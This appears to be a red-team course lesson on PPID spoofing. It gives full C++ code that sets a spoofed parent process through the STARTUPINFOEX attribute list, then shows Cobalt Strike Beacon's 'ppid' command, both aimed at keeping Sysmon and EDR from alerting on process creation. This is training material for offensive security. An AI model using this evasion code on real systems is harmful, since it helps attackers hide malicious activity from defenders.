When using the CreateProcess API, by default, the resulting process will spawn as a child of the caller.  This is why in the previous section we saw rundll32 and notepad spawn as children of PowerShell.  However, the "PPID spoofing" technique allows the caller to change the parent process for the spawned process.  So if our Beacon was running in powershell.exe, we can spawn processes as children of a completely different process, such as explorer.exe.

This will cause applications such as Sysmon to log the process creation under the new parent.  This is especially useful if you have a Beacon running in an unusual process (e.g. from an initial compromise, lateral movement or some other exploit delivery) and process creation events would raise high severity alerts or be blocked outright.

The magic is achieved in the [STARTUPINFOEX](https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexw) struct, which has an **LPPROC_THREAD_ATTRIBUTE_LIST** property.  This allows us to pass additional attributes to the CreateProcess call.  The attributes themselves are listed [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute).  For the purpose of PPID spoofing, the one of interest is **PROC_THREAD_ATTRIBUTE_PARENT_PROCESS**.

> The lpValue parameter is a pointer to **a handle to a process** to use instead of the calling process as the parent for the process being created. The process to use must have the PROCESS_CREATE_PROCESS access right.

Before looking at Cobalt Strike, let's do this in code.  I'm going to bring in the target parent PID on the command line for ease of use.  Then initialise the STARTUPINFOEX struct.

```c++
#include <iostream>
#include <Windows.h>
#include <winternl.h>

int main(int argc, const char* argv[])
{
	// Get parent process PID from the command line
	DWORD parentPid = atoi(argv[1]);

	// Initialise STARTUPINFOEX
	STARTUPINFOEX sie = { sizeof(sie) };
}
```

  

The next step is to allocate a region of memory to hold the attribute list, but we need to know the required size first.  The list can have multiple attributes, but as we're only interested in PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, the size is **1**.  So we call InitializeProcThreadAttributeList and provide a NULL destination, but the lpSize variable will become populated with the size we need.  Even though this API returns a bool, this call will always return FALSE.

```
// Call InitializeProcThreadAttributeList once
// it will return FALSE but populate lpSize
SIZE_T lpSize;
InitializeProcThreadAttributeList(NULL, 1, 0, &lpSize);
```

  

With that, use malloc to allocate the memory region on the lpAttributeList property of STARTUPINFOEX.  Then we call InitializeProcThreadAttributeList again, but this time, set the correct location.  This time, it should return TRUE.

```
// Allocate memory for the attribute list on STARTUPINFOEX
sie.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

// Call InitializeProcThreadAttributeList again, it should return TRUE this time
if (!InitializeProcThreadAttributeList(sie.lpAttributeList, 1, 0, &lpSize))
{
	printf("InitializeProcThreadAttributeList failed. Error code: %d.\n", GetLastError());
	return 0;
}
```

  

Get a handle to the parent process and pass that into a call to UpdateProcThreadAttribute.

```c++
// Get the handle to the process to act as the parent
HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);

// Call UpdateProcThreadAttribute, should return TRUE
if (!UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
{
	printf("UpdateProcThreadAttribute failed. Error code: %d.\n", GetLastError());
	return 0;
}
```

  

All that's left to do is call CreateProcess, ensuring to pass the EXTENDED_STARTUPINFO_PRESENT flag.

```c++
// Call CreateProcess and pass the EXTENDED_STARTUPINFO_PRESENT flag
PROCESS_INFORMATION pi;

if (!CreateProcess(
	L"C:\\Windows\\System32\\notepad.exe",
	NULL,
	0,
	0,
	FALSE,
	EXTENDED_STARTUPINFO_PRESENT,
	NULL,
	L"C:\\Windows\\System32",
	&sie.StartupInfo,
	&pi))
{
	printf("CreateProcess failed. Error code: %d.\n", GetLastError());
	return 0;
}

printf("PID created: %d", pi.dwProcessId);
return 1;
```

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/notepad.png)

  

A well-behaved program will also call DeleteProcThreadAttributeList after the process has been created.

```
DeleteProcThreadAttributeList(sie.lpAttributeList);
```

  

Cobalt Strike's `ppid` command can be used to set the parent process for all Beacon post-ex capabilities that spawn a process. Everything from `shell`, `run`, `execute-assembly`, `shspawn` and so on.

As we know, Beacon will use itself as the parent by default.  Running `shell ping`, we can see cmd.exe is spawned as a child of powershell.exe

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/ping-no-spoof.png)

  

Use the PPID command to change it to explorer and run `shell ping` again.

```
beacon> ppid 2704
[*] Tasked beacon to spoof 2704 as parent process
```

cmd.exe is now a child of explorer.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/ping-spoof.png)![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/ping-spoof-ph.png)

  

To reset the PPID back to the Beacon process, use the `ppid` command without parameters.

```
beacon> ppid
[*] Tasked beacon to use itself as parent process
```